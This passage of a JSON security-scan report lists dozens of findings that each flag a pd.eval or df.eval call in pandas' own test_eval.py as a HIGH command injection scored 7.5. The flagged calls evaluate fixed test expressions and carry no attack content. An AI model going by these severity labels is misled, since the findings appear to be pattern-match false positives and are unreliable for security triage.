          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 388,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(expr, engine=engine, parser=parser)",
            "context": "        if engine == \"numexpr\":\n            msg = \"couldn't find matching opcode for 'invert_dd'\"\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(expr, engine=engine, parser=parser)\n        else:\n            msg = \"ufunc 'invert' not supported for the input types\"\n            with pytest.raises(TypeError, match=msg):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 392,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(expr, engine=engine, parser=parser)",
            "context": "        else:\n            msg = \"ufunc 'invert' not supported for the input types\"\n            with pytest.raises(TypeError, match=msg):\n                pd.eval(expr, engine=engine, parser=parser)\n\n        # int raises on numexpr\n        lhs = DataFrame(np.random.default_rng(2).integers(5, size=(5, 2)))",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 399,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(expr, engine=engine, parser=parser)",
            "context": "        if engine == \"numexpr\":\n            msg = \"couldn't find matching opcode for 'invert\"\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(expr, engine=engine, parser=parser)\n        else:\n            expect = ~lhs\n            result = pd.eval(expr, engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 402,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(expr, engine=engine, parser=parser)",
            "context": "                pd.eval(expr, engine=engine, parser=parser)\n        else:\n            expect = ~lhs\n            result = pd.eval(expr, engine=engine, parser=parser)\n            tm.assert_frame_equal(expect, result)\n\n        # bool always works",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 408,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(expr, engine=engine, parser=parser)",
            "context": "        # bool always works\n        lhs = DataFrame(np.random.default_rng(2).standard_normal((5, 2)) > 0.5)\n        expect = ~lhs\n        result = pd.eval(expr, engine=engine, parser=parser)\n        tm.assert_frame_equal(expect, result)\n\n        # object raises",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 417,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(expr, engine=engine, parser=parser)",
            "context": "        )\n        if engine == \"numexpr\":\n            with pytest.raises(ValueError, match=\"unknown type object\"):\n                pd.eval(expr, engine=engine, parser=parser)\n        else:\n            msg = \"bad operand type for unary ~: 'str'\"\n            with pytest.raises(TypeError, match=msg):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 421,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(expr, engine=engine, parser=parser)",
            "context": "        else:\n            msg = \"bad operand type for unary ~: 'str'\"\n            with pytest.raises(TypeError, match=msg):\n                pd.eval(expr, engine=engine, parser=parser)\n\n    def test_series_invert(self, engine, parser):\n        # ~ ####",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 433,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(expr, engine=engine, parser=parser)",
            "context": "        if engine == \"numexpr\":\n            msg = \"couldn't find matching opcode for 'invert_dd'\"\n            with pytest.raises(NotImplementedError, match=msg):\n                result = pd.eval(expr, engine=engine, parser=parser)\n        else:\n            msg = \"ufunc 'invert' not supported for the input types\"\n            with pytest.raises(TypeError, match=msg):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 437,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(expr, engine=engine, parser=parser)",
            "context": "        else:\n            msg = \"ufunc 'invert' not supported for the input types\"\n            with pytest.raises(TypeError, match=msg):\n                pd.eval(expr, engine=engine, parser=parser)\n\n        # int raises on numexpr\n        lhs = Series(np.random.default_rng(2).integers(5, size=5))",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 444,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(expr, engine=engine, parser=parser)",
            "context": "        if engine == \"numexpr\":\n            msg = \"couldn't find matching opcode for 'invert\"\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(expr, engine=engine, parser=parser)\n        else:\n            expect = ~lhs\n            result = pd.eval(expr, engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 447,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(expr, engine=engine, parser=parser)",
            "context": "                pd.eval(expr, engine=engine, parser=parser)\n        else:\n            expect = ~lhs\n            result = pd.eval(expr, engine=engine, parser=parser)\n            tm.assert_series_equal(expect, result)\n\n        # bool",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 453,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(expr, engine=engine, parser=parser)",
            "context": "        # bool\n        lhs = Series(np.random.default_rng(2).standard_normal(5) > 0.5)\n        expect = ~lhs\n        result = pd.eval(expr, engine=engine, parser=parser)\n        tm.assert_series_equal(expect, result)\n\n        # float",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 464,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(expr, engine=engine, parser=parser)",
            "context": "        lhs = Series([\"a\", 1, 2.0])\n        if engine == \"numexpr\":\n            with pytest.raises(ValueError, match=\"unknown type object\"):\n                pd.eval(expr, engine=engine, parser=parser)\n        else:\n            msg = \"bad operand type for unary ~: 'str'\"\n            with pytest.raises(TypeError, match=msg):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 468,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(expr, engine=engine, parser=parser)",
            "context": "        else:\n            msg = \"bad operand type for unary ~: 'str'\"\n            with pytest.raises(TypeError, match=msg):\n                pd.eval(expr, engine=engine, parser=parser)\n\n    def test_frame_negate(self, engine, parser):\n        expr = \"-lhs\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 476,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(expr, engine=engine, parser=parser)",
            "context": "        # float\n        lhs = DataFrame(np.random.default_rng(2).standard_normal((5, 2)))\n        expect = -lhs\n        result = pd.eval(expr, engine=engine, parser=parser)\n        tm.assert_frame_equal(expect, result)\n\n        # int",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 482,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(expr, engine=engine, parser=parser)",
            "context": "        # int\n        lhs = DataFrame(np.random.default_rng(2).integers(5, size=(5, 2)))\n        expect = -lhs\n        result = pd.eval(expr, engine=engine, parser=parser)\n        tm.assert_frame_equal(expect, result)\n\n        # bool doesn't work with numexpr but works elsewhere",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 490,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(expr, engine=engine, parser=parser)",
            "context": "        if engine == \"numexpr\":\n            msg = \"couldn't find matching opcode for 'neg_bb'\"\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(expr, engine=engine, parser=parser)\n        else:\n            expect = -lhs\n            result = pd.eval(expr, engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 493,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(expr, engine=engine, parser=parser)",
            "context": "                pd.eval(expr, engine=engine, parser=parser)\n        else:\n            expect = -lhs\n            result = pd.eval(expr, engine=engine, parser=parser)\n            tm.assert_frame_equal(expect, result)\n\n    def test_series_negate(self, engine, parser):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 502,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(expr, engine=engine, parser=parser)",
            "context": "        # float\n        lhs = Series(np.random.default_rng(2).standard_normal(5))\n        expect = -lhs\n        result = pd.eval(expr, engine=engine, parser=parser)\n        tm.assert_series_equal(expect, result)\n\n        # int",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 508,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(expr, engine=engine, parser=parser)",
            "context": "        # int\n        lhs = Series(np.random.default_rng(2).integers(5, size=5))\n        expect = -lhs\n        result = pd.eval(expr, engine=engine, parser=parser)\n        tm.assert_series_equal(expect, result)\n\n        # bool doesn't work with numexpr but works elsewhere",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 516,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(expr, engine=engine, parser=parser)",
            "context": "        if engine == \"numexpr\":\n            msg = \"couldn't find matching opcode for 'neg_bb'\"\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(expr, engine=engine, parser=parser)\n        else:\n            expect = -lhs\n            result = pd.eval(expr, engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 519,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(expr, engine=engine, parser=parser)",
            "context": "                pd.eval(expr, engine=engine, parser=parser)\n        else:\n            expect = -lhs\n            result = pd.eval(expr, engine=engine, parser=parser)\n            tm.assert_series_equal(expect, result)\n\n    @pytest.mark.parametrize(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 537,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(expr, engine=engine, parser=parser)",
            "context": "        expr = \"+lhs\"\n        expect = lhs\n\n        result = pd.eval(expr, engine=engine, parser=parser)\n        tm.assert_frame_equal(expect, result)\n\n    @pytest.mark.parametrize(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 555,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(expr, engine=engine, parser=parser)",
            "context": "        expr = \"+lhs\"\n        expect = lhs\n\n        result = pd.eval(expr, engine=engine, parser=parser)\n        tm.assert_series_equal(expect, result)\n\n    def test_scalar_unary(self, engine, parser):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 564,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"~1.0\", engine=engine, parser=parser)",
            "context": "        if PY312 and not (engine == \"numexpr\" and parser == \"pandas\"):\n            warn = DeprecationWarning\n        with pytest.raises(TypeError, match=msg):\n            pd.eval(\"~1.0\", engine=engine, parser=parser)\n\n        assert pd.eval(\"-1.0\", parser=parser, engine=engine) == -1.0\n        assert pd.eval(\"+1.0\", parser=parser, engine=engine) == +1.0",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 566,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert pd.eval(\"-1.0\", parser=parser, engine=engine) == -1.0",
            "context": "        with pytest.raises(TypeError, match=msg):\n            pd.eval(\"~1.0\", engine=engine, parser=parser)\n\n        assert pd.eval(\"-1.0\", parser=parser, engine=engine) == -1.0\n        assert pd.eval(\"+1.0\", parser=parser, engine=engine) == +1.0\n        assert pd.eval(\"~1\", parser=parser, engine=engine) == ~1\n        assert pd.eval(\"-1\", parser=parser, engine=engine) == -1",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 567,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert pd.eval(\"+1.0\", parser=parser, engine=engine) == +1.0",
            "context": "            pd.eval(\"~1.0\", engine=engine, parser=parser)\n\n        assert pd.eval(\"-1.0\", parser=parser, engine=engine) == -1.0\n        assert pd.eval(\"+1.0\", parser=parser, engine=engine) == +1.0\n        assert pd.eval(\"~1\", parser=parser, engine=engine) == ~1\n        assert pd.eval(\"-1\", parser=parser, engine=engine) == -1\n        assert pd.eval(\"+1\", parser=parser, engine=engine) == +1",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 568,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert pd.eval(\"~1\", parser=parser, engine=engine) == ~1",
            "context": "\n        assert pd.eval(\"-1.0\", parser=parser, engine=engine) == -1.0\n        assert pd.eval(\"+1.0\", parser=parser, engine=engine) == +1.0\n        assert pd.eval(\"~1\", parser=parser, engine=engine) == ~1\n        assert pd.eval(\"-1\", parser=parser, engine=engine) == -1\n        assert pd.eval(\"+1\", parser=parser, engine=engine) == +1\n        with tm.assert_produces_warning(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 569,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert pd.eval(\"-1\", parser=parser, engine=engine) == -1",
            "context": "        assert pd.eval(\"-1.0\", parser=parser, engine=engine) == -1.0\n        assert pd.eval(\"+1.0\", parser=parser, engine=engine) == +1.0\n        assert pd.eval(\"~1\", parser=parser, engine=engine) == ~1\n        assert pd.eval(\"-1\", parser=parser, engine=engine) == -1\n        assert pd.eval(\"+1\", parser=parser, engine=engine) == +1\n        with tm.assert_produces_warning(\n            warn, match=\"Bitwise inversion\", check_stacklevel=False",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 570,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert pd.eval(\"+1\", parser=parser, engine=engine) == +1",
            "context": "        assert pd.eval(\"+1.0\", parser=parser, engine=engine) == +1.0\n        assert pd.eval(\"~1\", parser=parser, engine=engine) == ~1\n        assert pd.eval(\"-1\", parser=parser, engine=engine) == -1\n        assert pd.eval(\"+1\", parser=parser, engine=engine) == +1\n        with tm.assert_produces_warning(\n            warn, match=\"Bitwise inversion\", check_stacklevel=False\n        ):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 574,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert pd.eval(\"~True\", parser=parser, engine=engine) == ~True",
            "context": "        with tm.assert_produces_warning(\n            warn, match=\"Bitwise inversion\", check_stacklevel=False\n        ):\n            assert pd.eval(\"~True\", parser=parser, engine=engine) == ~True\n        with tm.assert_produces_warning(\n            warn, match=\"Bitwise inversion\", check_stacklevel=False\n        ):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 578,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert pd.eval(\"~False\", parser=parser, engine=engine) == ~False",
            "context": "        with tm.assert_produces_warning(\n            warn, match=\"Bitwise inversion\", check_stacklevel=False\n        ):\n            assert pd.eval(\"~False\", parser=parser, engine=engine) == ~False\n        assert pd.eval(\"-True\", parser=parser, engine=engine) == -True\n        assert pd.eval(\"-False\", parser=parser, engine=engine) == -False\n        assert pd.eval(\"+True\", parser=parser, engine=engine) == +True",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 579,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert pd.eval(\"-True\", parser=parser, engine=engine) == -True",
            "context": "            warn, match=\"Bitwise inversion\", check_stacklevel=False\n        ):\n            assert pd.eval(\"~False\", parser=parser, engine=engine) == ~False\n        assert pd.eval(\"-True\", parser=parser, engine=engine) == -True\n        assert pd.eval(\"-False\", parser=parser, engine=engine) == -False\n        assert pd.eval(\"+True\", parser=parser, engine=engine) == +True\n        assert pd.eval(\"+False\", parser=parser, engine=engine) == +False",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 580,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert pd.eval(\"-False\", parser=parser, engine=engine) == -False",
            "context": "        ):\n            assert pd.eval(\"~False\", parser=parser, engine=engine) == ~False\n        assert pd.eval(\"-True\", parser=parser, engine=engine) == -True\n        assert pd.eval(\"-False\", parser=parser, engine=engine) == -False\n        assert pd.eval(\"+True\", parser=parser, engine=engine) == +True\n        assert pd.eval(\"+False\", parser=parser, engine=engine) == +False\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 581,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert pd.eval(\"+True\", parser=parser, engine=engine) == +True",
            "context": "            assert pd.eval(\"~False\", parser=parser, engine=engine) == ~False\n        assert pd.eval(\"-True\", parser=parser, engine=engine) == -True\n        assert pd.eval(\"-False\", parser=parser, engine=engine) == -False\n        assert pd.eval(\"+True\", parser=parser, engine=engine) == +True\n        assert pd.eval(\"+False\", parser=parser, engine=engine) == +False\n\n    def test_unary_in_array(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 582,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert pd.eval(\"+False\", parser=parser, engine=engine) == +False",
            "context": "        assert pd.eval(\"-True\", parser=parser, engine=engine) == -True\n        assert pd.eval(\"-False\", parser=parser, engine=engine) == -False\n        assert pd.eval(\"+True\", parser=parser, engine=engine) == +True\n        assert pd.eval(\"+False\", parser=parser, engine=engine) == +False\n\n    def test_unary_in_array(self):\n        # GH 11235",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 589,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(\"[-True, True, +True, -False, False, +False, -37, 37, ~37, +37]\"),",
            "context": "        # TODO: 2022-01-29: result return list with numexpr 2.7.3 in CI\n        # but cannot reproduce locally\n        result = np.array(\n            pd.eval(\"[-True, True, +True, -False, False, +False, -37, 37, ~37, +37]\"),\n            dtype=np.object_,\n        )\n        expected = np.array(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 613,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = df.eval(expr)",
            "context": "    def test_float_comparison_bin_op(self, float_numpy_dtype, expr):\n        # GH 16363\n        df = DataFrame({\"x\": np.array([0], dtype=float_numpy_dtype)})\n        res = df.eval(expr)\n        assert res.values == np.array([False])\n\n    def test_unary_in_function(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 620,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = df.eval(\"x.fillna(-1)\")",
            "context": "        # GH 46471\n        df = DataFrame({\"x\": [0, 1, np.nan]})\n\n        result = df.eval(\"x.fillna(-1)\")\n        expected = df.x.fillna(-1)\n        # column name becomes None if using numexpr\n        # only check names when the engine is not numexpr",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 626,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = df.eval(\"x.shift(1, fill_value=-1)\")",
            "context": "        # only check names when the engine is not numexpr\n        tm.assert_series_equal(result, expected, check_names=not USE_NUMEXPR)\n\n        result = df.eval(\"x.shift(1, fill_value=-1)\")\n        expected = df.x.shift(1, fill_value=-1)\n        tm.assert_series_equal(result, expected, check_names=not USE_NUMEXPR)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 648,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(ex, engine=engine, parser=parser)",
            "context": "\n        msg = \"cannot evaluate scalar only bool ops|'BoolOp' nodes are not\"\n        with pytest.raises(NotImplementedError, match=msg):\n            pd.eval(ex, engine=engine, parser=parser)\n\n    def test_identical(self, engine, parser):\n        # see gh-10546",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 653,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(\"x\", engine=engine, parser=parser)",
            "context": "    def test_identical(self, engine, parser):\n        # see gh-10546\n        x = 1\n        result = pd.eval(\"x\", engine=engine, parser=parser)\n        assert result == 1\n        assert is_scalar(result)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 658,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(\"x\", engine=engine, parser=parser)",
            "context": "        assert is_scalar(result)\n\n        x = 1.5\n        result = pd.eval(\"x\", engine=engine, parser=parser)\n        assert result == 1.5\n        assert is_scalar(result)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 663,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(\"x\", engine=engine, parser=parser)",
            "context": "        assert is_scalar(result)\n\n        x = False\n        result = pd.eval(\"x\", engine=engine, parser=parser)\n        assert not result\n        assert is_bool(result)\n        assert is_scalar(result)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 669,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(\"x\", engine=engine, parser=parser)",
            "context": "        assert is_scalar(result)\n\n        x = np.array([1])\n        result = pd.eval(\"x\", engine=engine, parser=parser)\n        tm.assert_numpy_array_equal(result, np.array([1]))\n        assert result.shape == (1,)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 674,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(\"x\", engine=engine, parser=parser)",
            "context": "        assert result.shape == (1,)\n\n        x = np.array([1.5])\n        result = pd.eval(\"x\", engine=engine, parser=parser)\n        tm.assert_numpy_array_equal(result, np.array([1.5]))\n        assert result.shape == (1,)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 679,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(\"x\", engine=engine, parser=parser)",
            "context": "        assert result.shape == (1,)\n\n        x = np.array([False])  # noqa: F841\n        result = pd.eval(\"x\", engine=engine, parser=parser)\n        tm.assert_numpy_array_equal(result, np.array([False]))\n        assert result.shape == (1,)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 687,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(exp, engine=engine, parser=parser)",
            "context": "        # GH 11149\n        exp = \"\"\"1 + 2 * \\\n        5 - 1 + 2 \"\"\"\n        result = pd.eval(exp, engine=engine, parser=parser)\n        assert result == 12\n\n    def test_float_truncation(self, engine, parser):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 693,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(exp, engine=engine, parser=parser)",
            "context": "    def test_float_truncation(self, engine, parser):\n        # GH 14241\n        exp = \"1000000000.006\"\n        result = pd.eval(exp, engine=engine, parser=parser)\n        expected = np.float64(exp)\n        assert result == expected\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 730,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert pd.eval(\"not True\") == -2",
            "context": "        with tm.maybe_produces_warning(\n            DeprecationWarning, PY312, check_stacklevel=False\n        ):\n            assert pd.eval(\"not True\") == -2\n            assert pd.eval(\"not False\") == -1\n            assert pd.eval(\"True and not True\") == 0\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 731,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert pd.eval(\"not False\") == -1",
            "context": "            DeprecationWarning, PY312, check_stacklevel=False\n        ):\n            assert pd.eval(\"not True\") == -2\n            assert pd.eval(\"not False\") == -1\n            assert pd.eval(\"True and not True\") == 0\n\n    def test_and_logic_string_match(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 732,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert pd.eval(\"True and not True\") == 0",
            "context": "        ):\n            assert pd.eval(\"not True\") == -2\n            assert pd.eval(\"not False\") == -1\n            assert pd.eval(\"True and not True\") == 0\n\n    def test_and_logic_string_match(self):\n        # GH 25823",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 737,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert pd.eval(f\"{event.str.match('hello').a}\")",
            "context": "    def test_and_logic_string_match(self):\n        # GH 25823\n        event = Series({\"a\": \"hello\"})\n        assert pd.eval(f\"{event.str.match('hello').a}\")\n        assert pd.eval(f\"{event.str.match('hello').a and event.str.match('hello').a}\")\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 738,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert pd.eval(f\"{event.str.match('hello').a and event.str.match('hello').a}\")",
